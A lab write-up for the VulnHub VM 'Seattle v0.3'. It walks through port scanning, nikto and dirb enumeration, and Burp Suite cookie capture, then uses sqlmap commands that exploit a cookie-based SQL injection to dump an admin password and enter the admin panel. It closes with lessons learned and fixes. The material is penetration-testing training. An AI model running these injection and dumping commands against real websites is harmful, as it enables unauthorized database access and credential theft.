# Seattle: v0.3 — Writeup

| | |
|-|-|
| **Target IP** | 192.168.1.8 (host-only) |
| **Difficulty** | Easy |
| **OS** | Linux |
| **Goal** | Admin panel access (no flag file) |
| **Source** | [VulnHub](https://www.vulnhub.com/entry/seattle-v03,145/) |

## Attack Summary

nmap/nikto → blog tab username enumeration → Burp Suite cookie capture → sqlmap cookie-based SQLi → admin credentials → authenticated admin panel

## Methodology

1. Network discovery and port scan
2. Web enumeration (nikto finds `/admin/`)
3. Username enumeration via blog tab
4. SQLi via captured cookie (sqlmap)
5. Admin login with recovered credentials

---

## Step 1: Network Discovery

```bash
sudo netdiscover -i eth1 -r 192.168.1.0/24
nmap -p- -A 192.168.1.8
```

Only port 80 (HTTP) is open. The site is a simulated e-commerce application.

---

## Step 2: Web Enumeration

```bash
nikto -h 192.168.1.8
```

Nikto finds `/admin/` and `/images/`. Browse to the site and check each tab. The **Blog** tab contains a "Hey Admin!" link that reveals the username: **admin**.

```bash
dirb http://192.168.1.8/
```

---

## Step 3: Cookie Capture with Burp Suite

Configure Burp Suite as proxy (127.0.0.1:8080). Browse the site while intercepting traffic. When the application sets a session cookie, capture the full request and save it to a file:

```bash
# Save the intercepted request to /tmp/seattle_req.txt
```

The cookie contains a parameter vulnerable to SQL injection (error-based).

---

## Step 4: SQL Injection with sqlmap

List databases:

```bash
sqlmap -r /tmp/seattle_req.txt --dbs
# Found: seattle
```

List tables in the `seattle` database:

```bash
sqlmap -r /tmp/seattle_req.txt -D seattle --tables
# Found: tblMembers
```

Dump the password column:

```bash
sqlmap -r /tmp/seattle_req.txt -D seattle -T tblMembers -C password --dump
```

Recovered password: **Assasin1**

---

## Step 5: Admin Login

Navigate to the "My Account" tab and log in with:
- Username: `admin`
- Password: `Assasin1`

Admin panel is now accessible — objective complete.

---

## Lessons Learned

1. **Cookie-based SQL injection** — session cookies can carry user-supplied data passed directly into SQL queries without sanitization
2. **Username enumeration** — UI elements (blog posts, "Hey Admin!" links) should not expose valid usernames
3. **Weak credentials** — `Assasin1` is a predictable, dictionary-crackable password
4. **Admin panel exposure** — `/admin/` accessible without IP restrictions or additional authentication factors

## Vulnerabilities Present (from VulnHub description)

The VM intentionally includes multiple vulnerabilities not covered in this walkthrough:
- Reflected and stored XSS
- IDOR
- Path traversal
- Exposed `phpinfo()`
- Open admin interface

## Remediation

| Vulnerability | Fix |
|---------------|-----|
| Cookie SQLi | Use parameterized queries; never pass cookie values directly to SQL |
| Username enumeration | Return generic error messages; do not reveal valid usernames in UI |
| Weak admin password | Enforce strong password policy; use bcrypt for password storage |
| Exposed /admin/ | Restrict by IP; add 2FA for admin access |
